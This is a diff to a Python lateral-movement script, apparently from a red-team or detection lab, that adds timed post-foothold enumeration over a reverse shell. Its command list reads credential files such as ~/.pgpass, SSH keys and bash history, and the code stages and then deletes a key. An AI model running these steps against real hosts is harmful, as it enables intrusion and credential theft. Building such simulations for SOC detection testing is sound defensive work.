@@ -139,7 +139,8 @@ def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
 
 
 def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
-        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT):
+        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT,
+        *, pacing_speed: float = 100_000.0):
     """
     Execute the lateral-movement step.
 
@@ -149,6 +150,9 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
         workstation_ip (str):   target workstation IP.
         workstation_user (str): SSH username on workstation.
         workstation_port (int): SSH port on workstation.
+        pacing_speed (float):   divisor applied to attacker think-time during
+                                post-foothold enumeration. 1× = real-time
+                                (~80 s walk), 25× = ~3 s, 100 000× = ~0 s.
 
     Returns:
         socket: reverse shell as john.stravidis on the workstation, or None.
@@ -255,7 +259,46 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
     print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
 
+    # ------------------------------------------------------------------
+    # Phase 5 — Post-foothold enumeration walk
+    # ------------------------------------------------------------------
+    # An operator who just landed on a new host does not type one command
+    # and leave. Send a handful of typical "what do I have here" commands
+    # with scaled think-time between them. Each command appends to
+    # ~/.bash_history (lab-fim watches that → MODIFY events for the SOC),
+    # generates sshd session activity in auth.log, and lights up auditd
+    # execve once that lands. Skipping this in fast mode keeps dev/CI loops
+    # short.
+    if pacing_speed < 10_000:
+        _post_foothold_walk(john_shell, pacing_speed)
+
     return john_shell
+
+
+THINK_TIME_REALISTIC_SEC = 10  # average realistic gap between commands
+
+ENUM_COMMANDS = [
+    "whoami",
+    "id",
+    "uname -a",
+    "ls -la ~",
+    "cat ~/.bash_history | head -50",
+    "ls -la ~/.ssh/",
+    "cat ~/.pgpass 2>/dev/null || true",
+    "ls -la ~/Documents/",
+    "find /home -maxdepth 3 -name 'id_*' 2>/dev/null",
+]
+
+
+def _post_foothold_walk(shell, pacing_speed: float) -> None:
+    """Send typical post-foothold enumeration commands with scaled think time."""
+    print(f"[*] Post-foothold enumeration ({len(ENUM_COMMANDS)} commands, "
+          f"~{THINK_TIME_REALISTIC_SEC * len(ENUM_COMMANDS) / pacing_speed:.1f}s)")
+    for cmd in ENUM_COMMANDS:
+        time.sleep(THINK_TIME_REALISTIC_SEC / pacing_speed)
+        send_command(shell, cmd)
+        print(f"[*]   $ {cmd}")
+    print("[+] Enumeration complete")
 
 
 # Test mode — not executed when imported by main.py.
